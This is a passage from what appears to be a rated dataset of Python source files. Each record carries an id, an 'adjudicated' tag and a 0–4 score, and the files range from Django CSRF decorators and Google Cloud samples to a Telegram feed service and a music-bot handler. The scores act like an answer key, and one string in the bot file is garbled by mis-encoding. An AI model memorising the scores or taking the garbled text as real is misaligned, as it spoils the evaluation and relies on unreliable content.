    _svc_name_ = ""PyNativePipeTestService""
    _svc_display_name_ = ""Python Native Pipe Test Service""
    _svc_description_ = ""Tests Python.exe hosted services""
    # tell win32serviceutil we have a custom executable and custom args
    # so registration does the right thing.
    _exe_name_ = sys.executable
    _exe_args_ = '""' + os.path.abspath(sys.argv[0]) + '""'


def main():
    if len(sys.argv) == 1:
        # service must be starting...
        # for the sake of debugging etc, we use win32traceutil to see
        # any unhandled exceptions and print statements.
        import win32traceutil

        print(""service is starting..."")
        print(""(execute this script with '--help' if that isn't what you want)"")

        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(NativeTestPipeService)
        # Now ask the service manager to fire things up for us...
        servicemanager.StartServiceCtrlDispatcher()
        print(""service done!"")
    else:
        win32serviceutil.HandleCommandLine(NativeTestPipeService)


if __name__ == ""__main__"":
    try:
        main()
    except (SystemExit, KeyboardInterrupt):
        raise
    except:
        print(""Something went bad!"")
        import traceback

        traceback.print_exc()"
42	adjudicated	3	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START vision_async_batch_annotate_images]

from google.cloud import vision_v1


def sample_async_batch_annotate_images(
    input_image_uri=""gs://cloud-samples-data/vision/label/wakeupcat.jpg"",
    output_uri=""gs://your-bucket/prefix/"",
):
    """"""Perform async batch image annotation.""""""
    client = vision_v1.ImageAnnotatorClient()

    source = {""image_uri"": input_image_uri}
    image = {""source"": source}
    features = [
        {""type_"": vision_v1.Feature.Type.LABEL_DETECTION},
        {""type_"": vision_v1.Feature.Type.IMAGE_PROPERTIES},
    ]

    # Each requests element corresponds to a single image.  To annotate more
    # images, create a request element for each image and add it to
    # the array of requests
    requests = [{""image"": image, ""features"": features}]
    gcs_destination = {""uri"": output_uri}

    # The max number of responses to output in each JSON file
    batch_size = 2
    output_config = {""gcs_destination"": gcs_destination,
                     ""batch_size"": batch_size}

    operation = client.async_batch_annotate_images(requests=requests, output_config=output_config)

    print(""Waiting for operation to complete..."")
    response = operation.result(90)

    # The output is written to GCS with the provided output_uri as prefix
    gcs_output_uri = response.output_config.gcs_destination.uri
    print(""Output written to GCS with prefix: {}"".format(gcs_output_uri))


# [END vision_async_batch_annotate_images]"
153	adjudicated	0	"import datetime
import time

from telegramfeed import interfaces, repositories, services


class FeederService:
    def __init__(
        self,
        chat_interface: interfaces.ChatInterface,
        subscription_repo: repositories.SubscriptionRepo,
        feed_downloader_service: services.FeedDownloaderService,
    ):
        self.chat_interface = chat_interface
        self.subscription_repo = subscription_repo
        self.feed_downloader_service = feed_downloader_service

    def start(self):
        print(""Processing feeds"")
        self.process_feeds()

    def process_feeds(self):
        subscriptions = self.subscription_repo.fetch_all()
        for subscription in subscriptions:
            print(
                f""Processing subscription {subscription.feed_url} for user {subscription.user_id}""
            )
            self._manage_subscription(subscription)

    def _manage_subscription(self, subscription):
        feed_content = self.feed_downloader_service.download(subscription.feed_url)

        if ""entries"" not in feed_content.keys():
            return

        for entry in feed_content[""entries""]:
            self._manage_entry(subscription, entry)

        self._subscription_update_check(subscription)

    def _subscription_update_check(self, subscription):
        subscription.last_check = datetime.datetime.now()
        self.subscription_repo.update(subscription)

    def _manage_entry(self, subscription, entry):
        updated_parsed = datetime.datetime.fromtimestamp(
            time.mktime(entry[""updated_parsed""])
        )
        if subscription.last_check < updated_parsed:
            self.send_entry(subscription, entry)

    def send_entry(self, subscription, entry):
        try:
            self.chat_interface.send_message(subscription.user_id, entry[""link""])
        except Exception as e:
            print(f""Error sending message: {e}"")"
382	adjudicated	2	"def _fix_contents(filename, contents):
    import re

    contents = re.sub(
        r""from bytecode"", r'from _pydevd_frame_eval.vendored.bytecode', contents, flags=re.MULTILINE
    )

    contents = re.sub(
        r""import bytecode"", r'from _pydevd_frame_eval.vendored import bytecode', contents, flags=re.MULTILINE
    )

    # This test will import the wrong setup (we're not interested in it).
    contents = re.sub(
        r""def test_version\(self\):"", r'def skip_test_version(self):', contents, flags=re.MULTILINE
    )

    if filename.startswith('test_'):
        if 'pytestmark' not in contents:
            pytest_mark = '''
import pytest
from tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON
from tests_python.debug_constants import TEST_CYTHON
pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')
'''
            contents = pytest_mark + contents
    return contents


def main():
    import os

    # traverse root directory, and list directories as dirs and files as files
    for root, dirs, files in os.walk(os.path.dirname(__file__)):
        path = root.split(os.sep)
        for filename in files:
            if filename.endswith('.py') and filename != 'pydevd_fix_code.py':
                with open(os.path.join(root, filename), 'r') as stream:
                    contents = stream.read()

                new_contents = _fix_contents(filename, contents)
                if contents != new_contents:
                    print('fixed ', os.path.join(root, filename))
                    with open(os.path.join(root, filename), 'w') as stream:
                        stream.write(new_contents)

#             print(len(path) * '---', filename)


if __name__ == '__main__':
    main()"
13	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""choropleth.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
231	adjudicated	4	"""""""Latex filters.

Module of useful filters for processing Latex within Jinja latex templates.
""""""
# -----------------------------------------------------------------------------
# Copyright (c) 2013, the IPython Development Team.
#
# Distributed under the terms of the Modified BSD License.
#
# The full license is in the file COPYING.txt, distributed with this software.
# -----------------------------------------------------------------------------

# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------
import re

# -----------------------------------------------------------------------------
# Globals and constants
# -----------------------------------------------------------------------------

LATEX_RE_SUBS = ((re.compile(r""\.\.\.+""), r""{\\ldots}""),)

# Latex substitutions for escaping latex.
# see: http://stackoverflow.com/questions/16259923/how-can-i-escape-latex-special-characters-inside-django-templates

LATEX_SUBS = {
    ""&"": r""\&"",
    ""%"": r""\%"",
    ""$"": r""\$"",
    ""#"": r""\#"",
    ""_"": r""\_"",
    ""{"": r""\{"",
    ""}"": r""\}"",
    ""~"": r""\textasciitilde{}"",
    ""^"": r""\^{}"",
    ""\\"": r""\textbackslash{}"",
}


# -----------------------------------------------------------------------------
# Functions
# -----------------------------------------------------------------------------

__all__ = [""escape_latex""]


def escape_latex(text):
    """"""
    Escape characters that may conflict with latex.

    Parameters
    ----------
    text : str
        Text containing characters that may conflict with Latex
    """"""
    text = """".join(LATEX_SUBS.get(c, c) for c in text)
    for pattern, replacement in LATEX_RE_SUBS:
        text = pattern.sub(replacement, text)

    return text"
371	adjudicated	3	"from functools import wraps

from django.middleware.csrf import CsrfViewMiddleware, get_token
from django.utils.decorators import decorator_from_middleware

csrf_protect = decorator_from_middleware(CsrfViewMiddleware)
csrf_protect.__name__ = ""csrf_protect""
csrf_protect.__doc__ = """"""
This decorator adds CSRF protection in exactly the same way as
CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or
using the decorator multiple times, is harmless and efficient.
""""""


class _EnsureCsrfToken(CsrfViewMiddleware):
    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.
    def _reject(self, request, reason):
        return None


requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)
requires_csrf_token.__name__ = 'requires_csrf_token'
requires_csrf_token.__doc__ = """"""
Use this decorator on views that need a correct csrf_token available to
RequestContext, but without the CSRF protection that csrf_protect
enforces.
""""""


class _EnsureCsrfCookie(CsrfViewMiddleware):
    def _reject(self, request, reason):
        return None

    def process_view(self, request, callback, callback_args, callback_kwargs):
        retval = super().process_view(request, callback, callback_args, callback_kwargs)
        # Force process_response to send the cookie
        get_token(request)
        return retval


ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)
ensure_csrf_cookie.__name__ = 'ensure_csrf_cookie'
ensure_csrf_cookie.__doc__ = """"""
Use this decorator to ensure that a view sets a CSRF cookie, whether or not it
uses the csrf_token template tag, or the CsrfViewMiddleware is used.
""""""


def csrf_exempt(view_func):
    """"""Mark a view function as being exempt from the CSRF view protection.""""""
    # view_func.csrf_exempt = True would also work, but decorators are nicer
    # if they don't have side effects, so return a new function.
    def wrapped_view(*args, **kwargs):
        return view_func(*args, **kwargs)
    wrapped_view.csrf_exempt = True
    return wraps(view_func)(wrapped_view)"
260	adjudicated	0	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/PageNotFound.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/PageNotFound.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\""streamlit/proto/PageNotFound.proto\""!\n\x0cPageNotFound\x12\x11\n\tpage_name\x18\x01 \x01(\tb\x06proto3'
)




_PAGENOTFOUND = _descriptor.Descriptor(
  name='PageNotFound',
  full_name='PageNotFound',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='page_name', full_name='PageNotFound.page_name', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=38,
  serialized_end=71,
)

DESCRIPTOR.message_types_by_name['PageNotFound'] = _PAGENOTFOUND
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

PageNotFound = _reflection.GeneratedProtocolMessageType('PageNotFound', (_message.Message,), {
  'DESCRIPTOR' : _PAGENOTFOUND,
  '__module__' : 'streamlit.proto.PageNotFound_pb2'
  # @@protoc_insertion_point(class_scope:PageNotFound)
  })
_sym_db.RegisterMessage(PageNotFound)


# @@protoc_insertion_point(module_scope)"
240	adjudicated	4	"""""""MonitoredQueue classes and functions.""""""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.


from zmq import PUB
from zmq.devices.monitoredqueue import monitored_queue
from zmq.devices.proxydevice import ProcessProxy, Proxy, ProxyBase, ThreadProxy


class MonitoredQueueBase(ProxyBase):
    """"""Base class for overriding methods.""""""

    _in_prefix = b''
    _out_prefix = b''

    def __init__(
        self, in_type, out_type, mon_type=PUB, in_prefix=b'in', out_prefix=b'out'
    ):

        ProxyBase.__init__(self, in_type=in_type, out_type=out_type, mon_type=mon_type)

        self._in_prefix = in_prefix
        self._out_prefix = out_prefix

    def run_device(self):
        ins, outs, mons = self._setup_sockets()
        monitored_queue(ins, outs, mons, self._in_prefix, self._out_prefix)


class MonitoredQueue(MonitoredQueueBase, Proxy):
    """"""Class for running monitored_queue in the background.

    See zmq.devices.Device for most of the spec. MonitoredQueue differs from Proxy,
    only in that it adds a ``prefix`` to messages sent on the monitor socket,
    with a different prefix for each direction.

    MQ also supports ROUTER on both sides, which zmq.proxy does not.

    If a message arrives on `in_sock`, it will be prefixed with `in_prefix` on the monitor socket.
    If it arrives on out_sock, it will be prefixed with `out_prefix`.

    A PUB socket is the most logical choice for the mon_socket, but it is not required.
    """"""


class ThreadMonitoredQueue(MonitoredQueueBase, ThreadProxy):
    """"""Run zmq.monitored_queue in a background thread.

    See MonitoredQueue and Proxy for details.
    """"""


class ProcessMonitoredQueue(MonitoredQueueBase, ProcessProxy):
    """"""Run zmq.monitored_queue in a separate process.

    See MonitoredQueue and Proxy for details.
    """"""


__all__ = ['MonitoredQueue', 'ThreadMonitoredQueue', 'ProcessMonitoredQueue']"
300	adjudicated	1	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START automl_batch_predict_beta]
from google.cloud import automl_v1beta1 as automl


def batch_predict(
    project_id=""YOUR_PROJECT_ID"",
    model_id=""YOUR_MODEL_ID"",
    input_uri=""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl"",
    output_uri=""gs://YOUR_BUCKET_ID/path/to/save/results/"",
):
    """"""Batch predict""""""
    prediction_client = automl.PredictionServiceClient()

    # Get the full path of the model.
    model_full_id = automl.AutoMlClient.model_path(
        project_id, ""us-central1"", model_id
    )

    gcs_source = automl.GcsSource(input_uris=[input_uri])

    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)
    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)
    output_config = automl.BatchPredictOutputConfig(
        gcs_destination=gcs_destination
    )
    params = {}

    request = automl.BatchPredictRequest(
        name=model_full_id,
        input_config=input_config,
        output_config=output_config,
        params=params
    )
    response = prediction_client.batch_predict(
        request=request
    )

    print(""Waiting for operation to complete..."")
    print(
        ""Batch Prediction results saved to Cloud Storage bucket. {}"".format(
            response.result()
        )
    )
# [END automl_batch_predict_beta]"
91	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""funnel.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
211	adjudicated	2	"""""""Read and write notebooks in JSON format.""""""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import copy
import json

from ..notebooknode import from_dict
from .rwbase import (
    NotebookReader,
    NotebookWriter,
    rejoin_lines,
    split_lines,
    strip_transient,
)


class BytesEncoder(json.JSONEncoder):
    """"""A JSON encoder that accepts b64 (and other *ascii*) bytestrings.""""""

    def default(self, obj):
        if isinstance(obj, bytes):
            return obj.decode(""ascii"")
        return json.JSONEncoder.default(self, obj)


class JSONReader(NotebookReader):
    def reads(self, s, **kwargs):
        """"""Read a JSON string into a Notebook object""""""
        nb = json.loads(s, **kwargs)
        nb = self.to_notebook(nb, **kwargs)
        return nb

    def to_notebook(self, d, **kwargs):
        """"""Convert a disk-format notebook dict to in-memory NotebookNode

        handles multi-line values as strings, scrubbing of transient values, etc.
        """"""
        nb = from_dict(d)
        nb = rejoin_lines(nb)
        nb = strip_transient(nb)
        return nb


class JSONWriter(NotebookWriter):
    def writes(self, nb, **kwargs):
        """"""Serialize a NotebookNode object as a JSON string""""""
        kwargs[""cls""] = BytesEncoder
        kwargs[""indent""] = 1
        kwargs[""sort_keys""] = True
        kwargs[""separators""] = ("","", "": "")
        kwargs.setdefault(""ensure_ascii"", False)
        # don't modify in-memory dict
        nb = copy.deepcopy(nb)
        if kwargs.pop(""split_lines"", True):
            nb = split_lines(nb)
        nb = strip_transient(nb)
        return json.dumps(nb, **kwargs)


_reader = JSONReader()
_writer = JSONWriter()

reads = _reader.reads
read = _reader.read
to_notebook = _reader.to_notebook
write = _writer.write
writes = _writer.writes"
180	adjudicated	1	"""""""BuildMyResume URL Configuration

The `urlpatterns` list routes URLs to views. 
""""""
from django.contrib import admin
from django.contrib.auth import views as auth_views
from django.urls import path, include
from django.conf.urls.static import static
from django.conf import settings

from . import views
from users import views as users_views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.home_view, name='home'),

    path('home/', include(('home.urls', 'home'), namespace='home')),
    path('accounts/', include('allauth.urls')),

    path('signup/', users_views.signup, name='signup'),
    path('activate/<uidb64>/<token>/', users_views.activate, name='activate'),

    path('login/', auth_views.LoginView.as_view(template_name='users/login.html'), name='login'),
    path('logout/', auth_views.LogoutView.as_view(next_page='/accounts/login'), name='logout'),
    path('password-reset/', auth_views.PasswordResetView.as_view(template_name='users/password_reset.html'), name='password_reset'),
    path('password-reset/done/', auth_views.PasswordChangeDoneView.as_view(template_name='users/password_reset_done.html'), name='password_reset_done'),
    path('password-reset-confirm/<uidb64>/<token>/', auth_views.PasswordResetConfirmView.as_view(template_name='users/password_reset_confirm.html'), name='password_reset_confirm'),
    path('password-reset-complete/', auth_views.PasswordResetCompleteView.as_view(template_name='users/password_reset_complete.html'), name='password_reset_complete'),

    path('__debug__/', include('debug_toolbar.urls')),

]
if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) 
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)"
351	adjudicated	3	"from django.contrib.messages.storage.base import BaseStorage
from django.contrib.messages.storage.cookie import CookieStorage
from django.contrib.messages.storage.session import SessionStorage


class FallbackStorage(BaseStorage):
    """"""
    Try to store all messages in the first backend. Store any unstored
    messages in each subsequent backend.
    """"""

    storage_classes = (CookieStorage, SessionStorage)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.storages = [
            storage_class(*args, **kwargs) for storage_class in self.storage_classes
        ]
        self._used_storages = set()

    def _get(self, *args, **kwargs):
        """"""
        Get a single list of messages from all storage backends.
        """"""
        all_messages = []
        for storage in self.storages:
            messages, all_retrieved = storage._get()
            # If the backend hasn't been used, no more retrieval is necessary.
            if messages is None:
                break
            if messages:
                self._used_storages.add(storage)
            all_messages.extend(messages)
            # If this storage class contained all the messages, no further
            # retrieval is necessary
            if all_retrieved:
                break
        return all_messages, all_retrieved

    def _store(self, messages, response, *args, **kwargs):
        """"""
        Store the messages and return any unstored messages after trying all
        backends.

        For each storage backend, any messages not stored are passed on to the
        next backend.
        """"""
        for storage in self.storages:
            if messages:
                messages = storage._store(messages, response, remove_oldest=False)
            # Even if there are no more messages, continue iterating to ensure
            # storages which contained messages are flushed.
            elif storage in self._used_storages:
                storage._store([], response)
                self._used_storages.remove(storage)
        return messages"
173	adjudicated	0	"from pyrogram import filters

from config import BANNED_USERS
from ShizukaXMusic import YouTube, app
from ShizukaXMusic.utils.channelplay import get_channeplayCB
from ShizukaXMusic.utils.decorators.language import languageCB
from ShizukaXMusic.utils.stream.stream import stream


@app.on_callback_query(filters.regex(""LiveStream"") & ~BANNED_USERS)
@languageCB
async def play_live_stream(client, CallbackQuery, _):
    callback_data = CallbackQuery.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    vidid, user_id, mode, cplay, fplay = callback_request.split(""|"")
    if CallbackQuery.from_user.id != int(user_id):
        try:
            return await CallbackQuery.answer(_[""playcb_1""], show_alert=True)
        except:
            return
    try:
        chat_id, channel = await get_channeplayCB(_, cplay, CallbackQuery)
    except:
        return
    video = True if mode == ""v"" else None
    user_name = CallbackQuery.from_user.first_name
    await CallbackQuery.message.delete()
    try:
        await CallbackQuery.answer()
    except:
        pass
    mystic = await CallbackQuery.message.reply_text(
        _[""play_2""].format(channel) if channel else _[""play_1""]
    )
    try:
        details, track_id = await YouTube.track(vidid, True)
    except Exception:
        return await mystic.edit_text(_[""play_3""])
    ffplay = True if fplay == ""f"" else None
    if not details[""duration_min""]:
        try:
            await stream(
                _,
                mystic,
                user_id,
                details,
                chat_id,
                user_name,
                CallbackQuery.message.chat.id,
                video,
                streamtype=""live"",
                forceplay=ffplay,
            )
        except Exception as e:
            ex_type = type(e).__name__
            err = e if ex_type == ""AssistantErr"" else _[""general_3""].format(ex_type)
            return await mystic.edit_text(err)
    else:
        return await mystic.edit_text(""Éª á´á´É´'á´ á´ÊÉªÉ´á´ á´Êá´á´ Éªá´'s á´ ÊÉªá´ á´ sá´Êá´á´á´."")
    await mystic.delete()"
33	adjudicated	3	"import sys


class VendorImporter:
    """"""
    A PEP 302 meta path importer for finding optionally-vendored
    or otherwise naturally-installed packages from root_name.
    """"""

    def __init__(self, root_name, vendored_names=(), vendor_pkg=None):
        self.root_name = root_name
        self.vendored_names = set(vendored_names)
        self.vendor_pkg = vendor_pkg or root_name.replace('extern', '_vendor')

    @property
    def search_path(self):
        """"""
        Search first the vendor package then as a natural package.
        """"""
        yield self.vendor_pkg + '.'
        yield ''

    def find_module(self, fullname, path=None):
        """"""
        Return self when fullname starts with root_name and the
        target module is one vendored through this importer.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        if root:
            return
        if not any(map(target.startswith, self.vendored_names)):
            return
        return self

    def load_module(self, fullname):
        """"""
        Iterate over the search path to locate and load fullname.
        """"""
        root, base, target = fullname.partition(self.root_name + '.')
        for prefix in self.search_path:
            try:
                extant = prefix + target
                __import__(extant)
                mod = sys.modules[extant]
                sys.modules[fullname] = mod
                return mod
            except ImportError:
                pass
        else:
            raise ImportError(
                ""The '{target}' package is required; ""
                ""normally this is bundled with this package so if you get ""
                ""this warning, consult the packager of your ""
                ""distribution."".format(**locals())
            )

    def install(self):
        """"""
        Install this importer into sys.meta_path if not already present.
        """"""
        if self not in sys.meta_path:
            sys.meta_path.append(self)


names = 'six', 'packaging', 'pyparsing', 'ordered_set',
VendorImporter(__name__, names, 'setuptools._vendor').install()"
122	adjudicated	3	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import uuid

import google.auth

from google.cloud import speech_v1p1beta1 as speech

import pytest

import speech_model_adaptation_beta


STORAGE_URI = ""gs://cloud-samples-data/speech/brooklyn_bridge.raw""
_, PROJECT_ID = google.auth.default()
LOCATION = ""global""
client = speech.AdaptationClient()


def test_model_adaptation_beta(custom_class_id, phrase_set_id, capsys):
    class_id = custom_class_id
    phrase_id = phrase_set_id
    transcript = speech_model_adaptation_beta.transcribe_with_model_adaptation(
        PROJECT_ID, LOCATION, STORAGE_URI, class_id, phrase_id
    )
    assert ""how long is the Brooklyn Bridge"" in transcript


@pytest.fixture
def custom_class_id():
    # The custom class id can't be too long
    custom_class_id = f""customClassId{str(uuid.uuid4())[:8]}""
    yield custom_class_id
    # clean up resources
    CLASS_PARENT = (
        f""projects/{PROJECT_ID}/locations/{LOCATION}/customClasses/{custom_class_id}""
    )
    client.delete_custom_class(name=CLASS_PARENT)


@pytest.fixture
def phrase_set_id():
    # The phrase set id can't be too long
    phrase_set_id = f""phraseSetId{str(uuid.uuid4())[:8]}""
    yield phrase_set_id
    # clean up resources
    PHRASE_PARENT = (
        f""projects/{PROJECT_ID}/locations/{LOCATION}/phraseSets/{phrase_set_id}""
    )
    client.delete_phrase_set(name=PHRASE_PARENT)"
62	adjudicated	3	"from __future__ import annotations

import warnings

import numpy as np
import pyarrow

from pandas.errors import PerformanceWarning
from pandas.util._exceptions import find_stack_level


def fallback_performancewarning(version: str | None = None) -> None:
    """"""
    Raise a PerformanceWarning for falling back to ExtensionArray's
    non-pyarrow method
    """"""
    msg = ""Falling back on a non-pyarrow code path which may decrease performance.""
    if version is not None:
        msg += f"" Upgrade to pyarrow >={version} to possibly suppress this warning.""
    warnings.warn(msg, PerformanceWarning, stacklevel=find_stack_level())


def pyarrow_array_to_numpy_and_mask(
    arr, dtype: np.dtype
) -> tuple[np.ndarray, np.ndarray]:
    """"""
    Convert a primitive pyarrow.Array to a numpy array and boolean mask based
    on the buffers of the Array.

    At the moment pyarrow.BooleanArray is not supported.

    Parameters
    ----------
    arr : pyarrow.Array
    dtype : numpy.dtype

    Returns
    -------
    (data, mask)
        Tuple of two numpy arrays with the raw data (with specified dtype) and
        a boolean mask (validity mask, so False means missing)
    """"""
    dtype = np.dtype(dtype)

    buflist = arr.buffers()
    # Since Arrow buffers might contain padding and the data might be offset,
    # the buffer gets sliced here before handing it to numpy.
    # See also https://github.com/pandas-dev/pandas/issues/40896
    offset = arr.offset * dtype.itemsize
    length = len(arr) * dtype.itemsize
    data_buf = buflist[1][offset : offset + length]
    data = np.frombuffer(data_buf, dtype=dtype)
    bitmask = buflist[0]
    if bitmask is not None:
        mask = pyarrow.BooleanArray.from_buffers(
            pyarrow.bool_(), len(arr), [None, bitmask], offset=arr.offset
        )
        mask = np.asarray(mask)
    else:
        mask = np.ones(len(arr), dtype=bool)
    return data, mask"
365	adjudicated	0	"from sqlalchemy import create_engine
import pandas as pd

class Manager:
    __instance = None

    def __init__(self, engine=None, username=None, password=None, database=None, host=None, port=None):
        if Manager.__instance is None:
            self.engine_type = engine
            self.username = username
            self.password = password
            self.database = database
            self.host = host
            self.port = port
            self.url = self._generate_url()
            self.engine = create_engine(self.url)
            Manager.__instance = self
        else:
            raise Exception(""Cannot create multiple instances of Database class"")

    @staticmethod
    def get_instance(engine=None, username=None, password=None, database=None, host=None, port=None):
        if Manager.__instance is None:
            Manager(engine, username, password, database, host, port)
        return Manager.__instance

    def _generate_url(self):
        if self.engine_type == 'postgresql':
            return f""postgresql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        elif self.engine_type == 'mysql':
            return f""mysql+pymysql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        elif self.engine_type == 'sqlite':
            return f""sqlite:///{self.database}""
        elif self.engine_type == 'oracle':
            return f""oracle://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        elif self.engine_type == 'mssql':
            return f""mssql+pymssql://{self.username}:{self.password}@{self.host}:{self.port}/{self.database}""
        else:
            raise Exception(""Unsupported engine type"")

    def execute_query(self, query):
        with self.engine.connect() as conn:
            result = conn.execute(query)
            data = pd.DataFrame(result.fetchall(), columns=result.keys())
        return data"
225	adjudicated	0	"from django.contrib.auth.management.commands import createsuperuser
from django.core.management import CommandError
from django.db.models import EmailField
from allauth.account.models import EmailAddress


class Command(createsuperuser.Command):
    help = 'Crate a superuser, and allow password to be provided'

    def add_arguments(self, parser):
        super(Command, self).add_arguments(parser)
        parser.add_argument(
            '--password', dest='password', default=None,
            help='Specifies the password for the superuser.',
        )
        if self.UserModel.USERNAME_FIELD != ""username"":
            parser.add_argument(
                '--username', dest='username', default=None,
                help=""Specifies the username for the superuser""
            )

    def handle(self, *args, **options):
        password = options.get('password')
        username = options.get('username')
        database = options.get('database')
        email = options.get('email')

        User = self.UserModel
        username_field_type = type(User._meta.get_field(User.USERNAME_FIELD))
        username = email if username_field_type == EmailField else username
        username_type = ""email"" if username_field_type == EmailField else ""username""
        if not password or not username:
            raise CommandError(f""You need to specify both password and {username_type}."")
        options.update({User.USERNAME_FIELD: username})
        super(Command, self).handle(*args, **options)

        user = self.UserModel._default_manager.db_manager(database).get(**{User.USERNAME_FIELD: username})
        if password:
            user.set_password(password)
            user.save()

        if email:
            EmailAddress.objects.create(user=user, email=email, primary=True, verified=True)"
334	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

import typing

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.utils import Prehashed

if typing.TYPE_CHECKING:
    from cryptography.hazmat.backends.openssl.backend import Backend


def _evp_pkey_derive(backend: ""Backend"", evp_pkey, peer_public_key) -> bytes:
